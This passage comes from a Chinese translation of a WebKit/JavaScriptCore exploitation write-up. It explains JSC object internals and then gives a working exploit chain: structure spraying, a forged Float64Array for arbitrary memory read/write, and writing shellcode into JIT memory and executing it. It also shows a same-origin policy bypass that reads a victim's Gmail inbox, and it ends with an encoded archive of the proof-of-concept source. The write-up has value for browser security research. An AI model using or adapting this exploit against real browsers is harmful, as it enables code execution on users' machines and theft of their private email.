    jne bailout_to_interpreter;

    mov r2, [r0 + #inline_property_offset];

```


这只是几个慢于本地语言(如C语言)属性的几个指令。请注意，结构ID和属性偏移量被缓存在代码本身内部，这类代码的结构名称叫做内联缓存。

除了属性映射，结构还存储对ClassInfo实例的引用，该实例包含的类有`Float64Array` 、`HTMLParagraphElement`...，也可以通过以下小脚本理解：

```javascript

 Object.prototype.toString.call(object);

    // Might print "[object HTMLParagraphElement]"

```

然而，ClassInfo的更重要的属性是它的MethodTable引用，MethodTable包含一组函数指针，其类似于C++中的vtable。 大多数对象的相关操作[[20]](http://www.ecma-international.org/ecma-262/6.0/#sec-operations-on-objects)以及一些垃圾处理器的相关任务（例如访问所有引用的对象）都通过方法表中的方法实现。为了了解如何使用方法表，我们将通过下面列出的JSArray.cpp的代码片段来说明。此函数是JavaScript数组的ClassInfo实例的MethodTable的一部分，并且每当删除这样的实例的属性时被调用[[21](http://www.ecma-international.org/ecma-262/6.0/#sec-ordinary-object-internal-methods-and-internal-slots-delete-p)：

```javascript

 bool JSArray::deleteProperty(JSCell* cell, ExecState* exec,

                                 PropertyName propertyName)

    {

        JSArray* thisObject = jsCast<JSArray*>(cell);

        if (propertyName == exec->propertyNames().length)

            return false;

        return JSObject::deleteProperty(thisObject, exec, propertyName);

    }

```

正如我们所见，deleteProperty有一个特殊情况，它不会删除数组的.length属性，只是将请求转发给父对象实现。

下图总结了（并稍微简化了）不同C ++类之间一起构建JSC对象系统的关系:

```c

    +------------------------------------------+

            |                Butterfly                 |

            | baz | bar | foo | length: 2 | 42 | 13.37 |

            +------------------------------------------+

                                          ^

                                +---------+

               +----------+     |

               |          |     |

            +--+  JSCell  |     |      +-----------------+

            |  |          |     |      |                 |

            |  +----------+     |      |  MethodTable    |

            |       /\          |      |                 |

 References |       || inherits |      |  Put            |

   by ID in |  +----++----+     |      |  Get            |

  structure |  |          +-----+      |  Delete         |

      table |  | JSObject |            |  VisitChildren  |

            |  |          |<-----      |  ...            |

            |  +----------+     |      |                 |

            |       /\          |      +-----------------+

            |       || inherits |                  ^

            |  +----++----+     |                  |

            |  |          |     | associated       |

            |  | JSArray  |     | prototype        |

            |  |          |     | object           |

            |  +----------+     |                  |

            |                   |                  |

            v                   |          +-------+--------+

        +-------------------+   |          |   ClassInfo    |

        |    Structure      +---+      +-->|                |

        |                   |          |   |  Name: "Array" |

        | property: slot    |          |   |                |

        |     foo : 0       +----------+   +----------------+

        |     bar : 1       |

        |     baz : 2       |

        |                   |

        +-------------------+

```

# 6.Exploitation

既然我们已稍微了解JSObject类的内部，现在让我们回到创建Float64Array实例当中，这将为我们提供一个任意的内存读写原语。 显然，最重要的部分是JSCell头中的结构ID，相关的结构实例使我们的存储器“看起来像”一个Float64Array的引擎。 因此，我们需要知道结构表中的Float64Array结构的ID。

## 6.1-猜想结构字符

不幸的是，结构ID在需要时运行才会被分配，结构ID在不同的运行中不一定是静态的。此外，在引擎启动期间创建的结构ID是与版本相关的。因此，我们不知道Float64Array实例的结构ID，需要用某种方式去确定它。

不能使用任意结构ID，这也是一个稍微复杂的事情。这是因为其他圾收集单元的分配结构不是*JavaScript对象*（Javascript对象包括字符串，符号，正则表达式对象，甚至结构本身）。通过方法表(method table)调用

任何引用方法都将由于断言失败而导致崩溃。这些结构只有在引擎启动时候才会被分配，导致所有结构都具有相当低的ID。

为了解决这个问题，我们将使用一个简单的喷射方法：我们将通过喷射方法产生几千个结构体来表现Float64Array实例，然后选择一个高的初始ID，看看是否碰撞出一个正确的。

```javascript
for (var i = 0; i < 0x1000; i++) {

        var a = new Float64Array(1);

        // Add a new property to create a new Structure instance.

        a[randomString()] = 1337;

    }

```

我们可以使用'instanceof'验证猜测是否正确，如果我们没有，我们只有使用下一个结构。

```javascript
 while (!(fakearray instanceof Float64Array)) {

        // Increment structure ID by one here

    }

```

`Instanceof`是一个相当安全的操作，它只会获取结构，并从中获取继承类型，并与给定的继承类型进行指针比较。

## 6.2-伪造Float64数组

Float64数组由本地JSArrayBufferView类实现。除了标准的JSObject字段之外，这个类还包含指向后备存储器的指针（我们将其称为“向量”，类似于源码）、长度和模式字段（32位整数）。

由于我们将浮点值为64的数组放在另一个对象（从现在开始称为“容器”）的内联插槽中，我们必须处理由于JSValue编码而产生的一些限制。特别是，

* 不能为"Butterfly"设置nullptr指针，因为null不是有效的JSValue。 简单元素访问操作，不会访问“Butterfly”，这也是很好的

* 不能设置有效的模式字段，由于Nan-boxing，它必须大于0x00010000。但我们可以自由地控制长度字段。

* 只能将向量设置为指向另一个JSObject，因为这些是JSValue可以包含的唯一指针

为了突破最后一个限制，我们将设置Float64Array的向量来指向一个Uint8Array实例：

```c

+----------------+                  +----------------+

|  Float64Array  |   +------------->|  Uint8Array    |

|                |   |              |                |

|  JSCell        |   |              |  JSCell        |

|  butterfly     |   |              |  butterfly     |

|  vector  ------+---+              |  vector        |

|  length        |                  |  length        |

|  mode          |                  |  mode          |

+----------------+                  +----------------+

```

这样，我们就可以将第二个数组的数据指针设置为任意地址，为我们提供任意的内存读写。

下面是使用我们以前的exploit原语创建一个假的Float64Array实例的代码。然后用附加的攻击代码创建一个全局的“内存”对象，提供方便的方法来读取和写入任意内存区域。

```c
sprayFloat64ArrayStructures();

    // 创建要使用的数组

    // 读写目标内存地址

    var hax = new Uint8Array(0x1000);

    var jsCellHeader = new Int64([

        00, 0x10, 00, 00,       // m_structureID, current guess

        0x0,                    // m_indexingType

        0x27,                   // m_type, Float64Array

        0x18,                   // m_flags, OverridesGetOwnPropertySlot |

            // InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero

        0x1                     // m_cellState, NewWhite

    ]);

    var container = {

        jsCellHeader: jsCellHeader.encodeAsJSVal(),

        butterfly: false,       // Some arbitrary value

        vector: hax,

        lengthAndFlags: (new Int64('0x0001000000000010')).asJSValue()

    };

    // Create the fake Float64Array.

    var address = Add(addrof(container), 16);

    var fakearray = fakeobj(address);

    // Find the correct structure ID.

    while (!(fakearray instanceof Float64Array)) {

        jsCellHeader.assignAdd(jsCellHeader, Int64.One);

        container.jsCellHeader = jsCellHeader.encodeAsJSVal();

    }

    // 完成伪造，伪造的数组现在指向hax数组 

```

为了更好查看结果，这里使用了lldb调试输出。 容器对象位于0x11321e1a0：

```c
(lldb) x/6gx 0x11321e1a0

    0x11321e1a0: 0x0100150000001138 0x0000000000000000

    0x11321e1b0: 0x0118270000001000 0x0000000000000006

    0x11321e1c0: 0x0000000113217360 0x0001000000000010

    (lldb) p *(JSC::JSArrayBufferView*)(0x11321e1a0 + 0x10)

    (JSC::JSArrayBufferView) $0 = {

      JSC::JSNonFinalObject = {

        JSC::JSObject = {

          JSC::JSCell = {

            m_structureID = 4096

            m_indexingType = '\0'

            m_type = Float64ArrayType

            m_flags = '\x18'

            m_cellState = NewWhite

          }

          m_butterfly = {

            JSC::CopyBarrierBase = (m_value = 0x0000000000000006)

          }

        }

      }

      m_vector = {

        JSC::CopyBarrierBase = (m_value = 0x0000000113217360)

      }

      m_length = 16

      m_mode = 65536

    }

```

注意```m_butterfly```和```m_mode```是无效的，因为我们不能写null。 到这，暂时没有问题了，但一旦垃圾收集器运行发生时就会有问题。 这我们将在稍后进行处理。


## 6.3-执行shellcode

JavaScript引擎的一个特点就是所有的人都使用JIT编译。这个编译需要将指令写入存储器中的页面，并稍后执行它们。 为此，大多数引擎（包括JSC）分配可写和可执行的内存区域。这成为我们利用的一个好方向。 我们将使用我们的内存读写原语将一个指针泄漏到具有JavaScript函数的JIT编译代码中，然后将我们的shellcode写入并调用该函数，从而触发我们的代码执行。

附加的PoC实现了这一点。下面是runShellcode函数的相关部分：

```c
 // This simply creates a function and calls it multiple times to

    // trigger JIT compilation.

    var func = makeJITCompiledFunction();

    var funcAddr = addrof(func);

    print("[+] Shellcode function object @ " + funcAddr);

    var executableAddr = memory.readInt64(Add(funcAddr, 24));

    print("[+] Executable instance @ " + executableAddr);

    var jitCodeAddr = memory.readInt64(Add(executableAddr, 16));

    print("[+] JITCode instance @ " + jitCodeAddr);

    var codeAddr = memory.readInt64(Add(jitCodeAddr, 32));

    print("[+] RWX memory @ " + codeAddr.toString());

    print("[+] Writing shellcode...");

    memory.write(codeAddr, shellcode);

    print("[!] Jumping into shellcode...");

    func();

```

可以看出，PoC代码通过从JavaScript函数对象开始的，通过从一组对象的固定偏移读取一对指针来执行指针泄漏。 这不是很好,偏移可以在版本之间改变，但是足以用于演示。首先改进的是，应该尝试使用一些简单的试探（最高位全为零，“接近”其他已知存储器区域...）来检测有效指针。 接下来，可以基于唯一的存储器模式来检测一些对象。例如，从JSCell继承的所有类（例如ExecutableBase）要以可识别的头开始。 此外，JIT编译的代码本身可能会以一个已知的函数序言开始。

请注意，从iOS10开始，JSC不再分配一个RWX区域，而是使用两个虚拟映射到同一物理内存区域，其中一个可执行，另一个可写。然后在运行时出现memcpy的特殊版本，其可写区域的随机地址作为立即值，并被映射为--X，防止攻击者读取地址。 为了绕过这个，现在需要一个短的ROP链来调用这个memcpy，然后才进入可执行映射。


## 6.4-维持激活垃圾收集


如果我们想保持渲染器进程存活周期超过我们的初始漏洞周期（稍后会看到为什么想要做到这一点），则面临的是垃圾收集器启动进程就立即崩溃。发生的这个情况主要是因为我们伪造的Float64Array的“Butterfly”在GC期间会被访问，它又是一个无效的指针（不是null指针）。从JSObject 访问子对象：

```c
Butterfly* butterfly = thisObject->m_butterfly.get();

    if (butterfly)

        thisObject->visitButterfly(visitor, butterfly,

                                   thisObject->structure(visitor.vm()));

```

如果我们可以将伪造的数组的“Butterfly”指针设置为nullptr指针，这会导致另一个崩溃。因为指针值也是容器对象的属性，并且它会被当作一个JSObject指针。 所以我们可以这样做：

1. 创建一个空对象。此对象的结构将包含具有默认数量的内联存储（6个插槽）的对象，并且全部不处于使用状态。

2. 将JSCell头（包含结构ID）复制到容器对象。这样就可以让引擎“忘记”构成假数组的容器的对象的属性。

3. 将假数组的“Butterfly”指针设置为nullptr指针，且使用默认的Float64Array实例来替换该对象的JSCell。


最后一步是必需的，在我们结构喷射(spray)之前，可以获得一个具有一些属性的Flotation64Array构造。

这三个步骤给我们的漏洞利用有了一个稳定的执行。

>注意，当覆盖JIT编译函数的代码时，如果需要进程继续就必须注意返回有效的JSValue。 如果不这样做，返回的值将由引擎保存并由收集器检查可能会导致在下一个GC期间崩溃。

## 6.5-总结

这时，到了快速总结完整利用的时候了。

1. 喷射Float64Array结构

2. 分配具有内联属性的容器对象，它们一起在内联属性槽中构建一个Float64Array实例。使用适用于之前喷射的高初始化结构ID，将数组的数据指针设置为指向一个Uint8Array实例。

3. 泄漏容器对象的地址，并创建一个指向Float64Array容器对象内的假对象

4. 使用“instanceof”查看结构ID的猜测是否正确。如果通过分配新的容器对象的对应属性值不能增加结构ID，就一直重复操作，直到获得一个Float64Array为止。

5. 通过写入Uint8Array的数据指针来读取、写入任意存储器地址

6. 修复容器和Float64Array实例，避免在垃圾收集过程中崩溃.



# 7.渲染器进程的滥用

通常讲到这，下一个步骤就是激发某种沙盒逃出漏洞来进一步攻击目标机器。

但这些的讨论超出了本文的范围，并且由于在其他地方的讲了很多，我们就探讨当前的情况就行。

## 7.1 - WebKit进程和权限模型

自[WebKit 2 [22]](https://trac.webkit.org/wiki/WebKit2)（大约2011年）以来，WebKit提供了一个多进程模型，该进程模型为每个选项卡生成一个新的渲染器进程。不仅提供了稳定性和提升了性能，也为沙盒基础设施提供了支撑基础。沙盒的出现限制了受损渲染器进程对系统可能造成的损害。


## 7.2-同源政策

同源策略（SOP）为客户端的Web安全提供了基础，它防止源自A的内容干扰源自B的内容。这包括脚本级的访问（例如访问另一窗口内的DOM对象）以及网络级的访问（例如XMLHttpRequest）。有趣的是，在WebKit中，SOP是在渲染器进程内是强制执行的，这意味着我们可以在里面绕过它。目前所有主要的网络浏览器都是如此，不过chrome正在改进它们的网站隔离项[[23]](https://www.chromium.org/developers/design-documents/site-isolation)。

这个也不是什么新的内容，在过去被也常常利用，但的确值得讨论。实质上，这意味着渲染器进程可以完全访问所有浏览器会话，并且可以发送经过身份验证的跨源请求并读取响应。因此，损害渲染器进程的攻击者能获得对受害者的浏览器会话访问的权限。

为了演示这个说法，我们现在将修改我们的exploit，来显示用户的gmail收件箱邮件。

## 7.3 - 盗取电子邮件

WebKit中的SecurityOrigin类中有一个有趣的字段：m_universalAccess。 如果它被设置，它将导致所有跨源检查成功。 我们可以通过跟随一组指针（其偏移量还取决于当前的Safari版本）获得对当前活动的SecurityDomain实例的引用。然后，可以为渲染器进程启用universalAccess，执行身份验证的跨源对象XMLHttpRequest。最后阅读gmail中的电子邮件就变得简单了。

```javascript
var xhr = new XMLHttpRequest();

    xhr.open('GET', 'https://mail.google.com/mail/u/0/#inbox', false);

    xhr.send();     // xhr.responseText now contains the full response

```

这个exploit可以显示“用户”当前的Gmail邮箱，如果要具体实现，需要在gmail中进行有效的session。


# 8. 参考文献

[1] http://www.zerodayinitiative.com/advisories/ZDI-16-485/

[2] https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/

[3] http://trac.webkit.org/wiki/JavaScriptCore

[4] http://www.ecma-international.org/ecma-262/6.0/#sec-ecmascript-data-types-and-values

[5] http://www.ecma-international.org/ecma-262/6.0/#sec-objects

[6] https://en.wikipedia.org/wiki/Double-precision_floating-point_format

[7] http://www.ecma-international.org/ecma-262/6.0/#sec-array-exotic-objects

[8] http://www.ecma-international.org/ecma-262/6.0/#sec-ecmascript-standard-built-in-objects

[9] https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/slice

[10]https://github.com/WebKit/webkit/blob/320b1fc3f6f47a31b6ccb4578bcea56c32c9e10b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp#L848

[11] https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/species

[12] http://www.ecma-international.org/ecma-262/6.0/#sec-type-conversion

[13] https://bugzilla.mozilla.org/show_bug.cgi?id=735104

[14] https://bugzilla.mozilla.org/show_bug.cgi?id=983344

[15] https://bugs.chromium.org/p/chromium/issues/detail?id=554946

[16]https://www.gnu.org/software/guile/manual/html_node/Conservative-GC.html

[17] http://www.ecma-international.org/ecma-262/6.0/#sec-ecmascript-language-types-number-type

[18] http://www.ecma-international.org/ecma-262/6.0/#sec-typedarray-objects

[19] https://developers.google.com/v8/design#fast-property-access

[20] http://www.ecma-international.org/ecma-262/6.0/#sec-operations-on-objects

[21] http://www.ecma-international.org/ecma-262/6.0/#sec-ordinary-object-internal-methods-and-internal-slots-delete-p

[22] https://trac.webkit.org/wiki/WebKit2

[23] https://www.chromium.org/developers/design-documents/site-isolation

#9.源码

```c
begin 644 src.zip
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
